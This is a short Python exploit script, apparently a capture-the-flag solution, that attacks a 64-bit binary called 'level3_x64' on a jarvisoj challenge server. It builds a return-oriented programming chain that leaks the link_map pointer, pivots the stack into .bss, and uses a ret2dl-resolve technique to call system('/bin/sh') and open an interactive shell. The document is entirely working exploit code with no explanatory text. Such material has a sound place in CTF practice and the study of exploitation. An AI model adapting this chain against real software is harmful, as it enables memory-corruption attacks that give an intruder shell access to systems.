#!/usr/bin/env python

from roputils import *

DEBUG = 0
fpath = './level3_x64'
offset = 0x88
p4ret = 0x4006ac

rop = ROP(fpath)
addr_stage = rop.section('.bss') + 0x400
ptr_ret = rop.search(rop.section('.fini'))
write_got = 0x600A58
read_got = 0x600a60

buf = rop.retfill(offset)
buf += rop.call_chain_ptr(
    [write_got, 1, rop.got()+8, 8], 
    [read_got, 0, addr_stage, 350]
, pivot=addr_stage)

if DEBUG:
    p = Proc(rop.fpath)
else:
    p = Proc(host='pwn2.jarvisoj.com', port=9883)

print p.read(7)
raw_input('#1. leak link_map')
p.write(buf)

# print "[+] read: %r" % p.read(len(buf))
addr_link_map = p.read_p64()
print 'addr_link_map %x' % addr_link_map
addr_dt_debug = addr_link_map + 0x1c8

buf = rop.call_chain_ptr(
    [read_got, 0, addr_dt_debug, 8],
    [ptr_ret, addr_stage+310]
)

buf += rop.dl_resolve_call(addr_stage+210)
buf += rop.fill(210, buf)
buf += rop.dl_resolve_data(addr_stage+210, 'system')
buf += rop.fill(310, buf)
buf += rop.string('/bin/sh')
buf += rop.fill(350, buf)

p.write(buf)
p.write_p64(0)
p.interact(0)

